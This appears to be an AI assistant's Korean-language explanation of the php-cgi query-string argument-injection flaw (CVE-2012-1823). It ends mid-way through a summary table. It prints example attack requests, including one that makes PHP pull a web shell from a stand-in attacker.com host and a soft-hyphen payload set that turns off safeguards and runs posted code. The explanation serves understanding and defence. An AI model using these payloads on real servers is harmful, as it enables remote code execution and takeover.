좋아요, 이 질문은 핵심을 아주 잘 짚으셨어요.
"**쿼리 스트링으로 PHP 인자를 넘긴다**"는 말이 정확히 뭘 의미하는지, **예시**와 함께 **쉽게 설명**드릴게요.

---

## ✅ 쿼리 스트링(Query String)이란?

웹 주소에서 `?` 뒤에 붙는 부분입니다.

예시:

```
http://example.com/index.php?name=kim&age=25
```

* 여기서 `?name=kim&age=25` 이 부분이 **쿼리 스트링**
* 보통은 **GET 방식의 파라미터 전달**용입니다

---

## ❗ 그런데 PHP가 CGI로 실행될 때 문제가 생깁니다

### 정상적인 구조

웹서버(Apache, Nginx 등)가 PHP 파일을 실행할 때,
`php-cgi.exe`에게는 **실행할 스크립트의 경로**만 넘겨줘야 합니다.

```bash
php-cgi.exe /var/www/html/index.php
```

---

## 💣 하지만 취약한 환경에서는...

**쿼리 스트링으로 PHP의 실행 옵션을 주입**할 수 있었던 문제가 발생했어요.

예시 공격 요청:

```
GET /php-cgi/php-cgi.exe?%2D%2Dallow_url_include%3D1+%2D%2Dauto_prepend_file%3Dhttp://attacker.com/shell.txt HTTP/1.1
```
```
%ADd+cgi.force_redirect%3D0+
%ADd+disable_functions%3D%22%22+
%ADd+allow_url_include%3D1+
%ADd+auto_prepend_file%3Dphp://input
```

→ 이걸 디코딩하면:

```
/php-cgi/php-cgi.exe?--allow_url_include=1 --auto_prepend_file=http://attacker.com/shell.txt
```

### 즉!

PHP 내부 옵션을 이렇게 직접 전달하게 되는 거예요:

```bash
php-cgi.exe --allow_url_include=1 --auto_prepend_file=http://attacker.com/shell.txt
```

💥 이건 마치 공격자가 PHP의 설정값을 마음대로 조작하는 것과 같아요.

---

## 🧨 왜 위험한가?

PHP 실행 옵션 중에는 이런 것들이 있어요:

| 옵션                  | 설명                  | 악용 시 효과              |
| ------------------- | ------------------- | -------------------- |
| `allow_url_include` | 외부 URL 포함 허용        | 외부 웹셸 불러오기 가능        |
| `auto_prepend_file` | PHP 파일 실행 전에 강제로 삽입 | 공격 코드 먼저 실행          |
| `disable_functions` | 위험 함수 해제            | system, exec 등 사용 가능 |

→ 이걸 쿼리 스트링으로 조작할 수 있었던 게 **CVE-2012-1823**의 본질입니다.

---

## 🔐 원래는 절대 안 돼야 함

정상적인 PHP 실행은 이렇게 되어야 하고:

```bash
php-cgi.exe /var/www/html/index.php
```

쿼리 스트링은 단지 **사용자 입력용**이어야 합니다:

```
/index.php?search=apple
```

그런데 **실행 옵션이 들어간다면? → 서버 통제권을 넘겨주는 셈**입니다.

---

## ✅ 결론 요약

| 질문               | 답변 |
| ---------------- | -- |
| 쿼리 스트링으로 PHP 인자를 |    |
